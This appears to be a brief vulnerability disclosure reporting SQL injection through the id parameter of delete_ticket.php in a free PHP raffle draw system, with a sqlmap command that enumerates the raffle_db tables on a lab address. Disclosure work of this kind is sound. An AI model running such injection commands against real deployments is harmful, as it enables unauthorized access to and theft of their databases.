vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/15951/raffle-draw-system-using-php-and-javascript-free-source-code.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：
![image](https://user-images.githubusercontent.com/30823782/213211108-27f9b4f6-c194-488b-95eb-3b4c25b6ae79.png)

sqlmap.py -u "http://192.168.249.88/php-js-raffle-draw/delete_ticket.php" --data "id=1" -D raffle_db --tables

![image](https://user-images.githubusercontent.com/30823782/213211217-67cbdfc1-9a98-47f9-b9dd-f52efa9a83a8.png)
